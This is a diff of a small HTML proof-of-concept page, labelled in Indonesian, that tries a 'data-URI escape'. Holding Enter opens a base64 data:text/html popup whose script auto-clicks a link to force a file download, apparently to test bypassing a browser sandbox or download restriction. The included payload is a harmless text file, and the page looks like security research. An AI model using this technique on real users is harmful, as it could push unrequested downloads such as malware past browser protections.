@@ -1,47 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 
 <head>
-    <title>Site A</title>
+    <meta charset="UTF-8">
+    <title>PoC - Clean Data-URI Escape</title>
     <style>
         body {
             background-color: #ffebee;
+            font-family: sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+
+        #targetBtn {
+            padding: 15px;
+            cursor: pointer;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 5px;
         }
     </style>
 </head>
 
 <body>
-    <h3>Situs A (Origin 1)</h3>
-    <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
+
+    <h3>Situs A (Sandboxed)</h3>
+    <button id="targetBtn">1. KLIK DULU</button>
+    <p>2. Lalu tahan <strong>ENTER</strong></p>
+
     <script>
-        document.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") {
-                console.log("Triggering Data-URI Escape...");
-                const payload = `
+        const rawPayload = `
             <html>
             <body>
-                <h1>Data URI Context</h1>
+                <h2 style="color:red">Konteks Data URI</h2>
                 <script>
                     try {
                         const a = document.createElement("a");
-                        // File palsu untuk ngetes download
-                        a.href = "data:application/octet-stream;base64,UE9DIC0gRGF0YSBVUkkgQnlwYXNz";
+                        a.href = "data:application/octet-stream;base64,U2FuZGJveCBCeXBhc3MgU3VjY2Vzcw==";
                         a.download = "data_uri_bypass.txt";
                         document.body.appendChild(a);
                         a.click();
-                        console.log("Download triggered in Data URI context");
-                    } catch (err) {
-                        console.error("Failed:", err.message);
-                    }
-                    // Jangan langsung tutup biar bisa cek console popup-nya
-                    setTimeout(() => { /* window.close(); */ }, 5000);
+                        console.log("Download dipicu!");
+                    } catch (e) { console.error(e.message); }
                 <\/script>
             </body>
             </html>
-        `.replace(/\n/g, "");
-                window.open("data:text/html," + encodeURIComponent(payload), "_blank", "width=400,height=300");
+        `;
+
+        const encodedPayload = btoa(rawPayload);
+
+        window.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                console.log("Membuka popup via Data-URI...");
+                window.open(
+                    "data:text/html;base64," + encodedPayload,
+                    "_blank",
+                    "width=400,height=300"
+                );
             }
         });
+
+        document.getElementById('targetBtn').focus();
     </script>
 </body>
 
